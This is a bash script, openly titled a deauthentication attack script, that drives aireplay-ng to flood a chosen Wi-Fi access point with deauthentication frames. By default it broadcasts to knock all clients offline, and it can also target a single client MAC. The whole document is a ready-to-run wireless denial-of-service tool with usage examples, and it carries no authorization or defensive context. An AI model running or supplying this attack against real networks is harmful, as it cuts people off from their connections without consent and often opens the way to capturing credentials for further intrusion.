#!/bin/bash
# Deauthentication Attack Script
# Usage: ./deauth.sh <BSSID> <CHANNEL> [client_mac] [packet_count]

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./deauth.sh <BSSID> <CHANNEL> [client_mac] [packet_count]"
    echo ""
    echo "Examples:"
    echo "  Broadcast deauth (all clients): ./deauth.sh 30:68:93:AC:96:AD 6 0 10"
    echo "  Targeted deauth:                ./deauth.sh 30:68:93:AC:96:AD 6 AA:BB:CC:DD:EE:FF 10"
    echo ""
    echo "Default: 10 deauth packets to broadcast (disconnects all clients)"
    exit 1
fi

BSSID=$1
CHANNEL=$2
CLIENT=${3:-FF:FF:FF:FF:FF:FF}  # Default to broadcast
COUNT=${4:-10}

echo "[*] Target AP: $BSSID"
echo "[*] Channel: $CHANNEL"
if [ "$CLIENT" = "FF:FF:FF:FF:FF:FF" ] || [ "$CLIENT" = "0" ]; then
    CLIENT="FF:FF:FF:FF:FF:FF"
    echo "[*] Target: ALL CLIENTS (broadcast deauth)"
else
    echo "[*] Target Client: $CLIENT"
fi
echo "[*] Packet Count: $COUNT"
echo ""

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Run deauth attack
echo "[*] Sending deauthentication frames..."
if [ "$CLIENT" = "FF:FF:FF:FF:FF:FF" ]; then
    # Broadcast deauth
    sudo aireplay-ng -0 $COUNT -a $BSSID alfa0
else
    # Targeted deauth
    sudo aireplay-ng -0 $COUNT -a $BSSID -c $CLIENT alfa0
fi

echo ""
echo "[+] Deauth attack complete"
